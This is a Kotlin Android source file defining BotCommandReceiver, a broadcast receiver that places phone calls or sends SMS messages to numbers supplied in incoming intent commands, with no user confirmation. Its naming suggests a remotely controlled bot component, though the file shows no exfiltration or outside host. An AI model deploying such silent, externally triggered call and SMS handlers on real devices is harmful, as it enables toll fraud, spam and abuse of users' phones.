package com.bot

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.telephony.SmsManager

class BotCommandReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val command = intent?.getStringExtra("command") ?: return

        when (command) {
            "call" -> {
                val number = intent.getStringExtra("number") ?: return
                val callIntent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$number")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context?.startActivity(callIntent)
            }
            "sms" -> {
                val number = intent.getStringExtra("number") ?: return
                val message = intent.getStringExtra("message") ?: return
                
                try {
                    val smsManager = context?.getSystemService(SmsManager::class.java)
                    smsManager?.sendTextMessage(number, null, message, null, null)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }
}